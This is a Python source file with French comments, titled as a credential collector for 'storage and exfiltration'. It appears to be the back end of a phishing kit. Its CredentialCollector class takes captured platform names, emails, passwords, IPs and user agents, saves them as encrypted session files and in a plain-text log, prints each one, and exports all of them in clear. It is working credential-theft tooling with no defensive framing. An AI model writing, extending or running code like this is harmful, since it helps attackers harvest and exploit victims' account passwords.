#!/usr/bin/env python3
"""
Collecteur de credentials - Stockage et exfiltration
"""

import json
import os
import base64
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2

class CredentialCollector:
    def __init__(self, encryption_key=None):
        self.sessions_dir = "sessions"
        self.log_file = "collected_credentials.log"
        self.encryption_key = encryption_key or self.generate_key()
        self.cipher = Fernet(self.encryption_key)
        
        os.makedirs(self.sessions_dir, exist_ok=True)
    
    def generate_key(self):
        """Génère une clé de chiffrement"""
        return Fernet.generate_key()
    
    def encrypt_data(self, data):
        """Chiffre les données collectées"""
        json_data = json.dumps(data, indent=2)
        encrypted = self.cipher.encrypt(json_data.encode())
        return encrypted
    
    def decrypt_data(self, encrypted_data):
        """Déchiffre les données"""
        try:
            decrypted = self.cipher.decrypt(encrypted_data)
            return json.loads(decrypted.decode())
        except:
            return None
    
    def collect_credentials(self, platform, email, password, extra_data=None):
        """Collecte et stocke les identifiants"""
        entry = {
            "timestamp": datetime.now().isoformat(),
            "platform": platform,
            "email": email,
            "password": password,
            "extra": extra_data or {},
            "user_agent": extra_data.get("user_agent", "") if extra_data else "",
            "ip": extra_data.get("ip", "") if extra_data else ""
        }
        
        # Sauvegarde chiffrée
        encrypted = self.encrypt_data(entry)
        filename = f"{self.sessions_dir}/{platform}_{email.split('@')[0]}_{int(datetime.now().timestamp())}.enc"
        
        with open(filename, "wb") as f:
            f.write(encrypted)
        
        # Log clair (pour debug uniquement)
        with open(self.log_file, "a") as f:
            f.write(f"[{entry['timestamp']}] {platform} | {email}:{password}\n")
        
        print(f"[+] Credentials collected: {email}:{password}")
        return filename
    
    def list_sessions(self):
        """Liste toutes les sessions collectées"""
        sessions = []
        for file in os.listdir(self.sessions_dir):
            if file.endswith(".enc"):
                with open(f"{self.sessions_dir}/{file}", "rb") as f:
                    data = self.decrypt_data(f.read())
                    if data:
                        sessions.append(data)
        return sessions
    
    def export_all_credentials(self):
        """Exporte tous les credentials en clair"""
        sessions = self.list_sessions()
        output = []
        for session in sessions:
            output.append(f"{session['platform']} | {session['email']}:{session['password']}")
        return "\n".join(output)
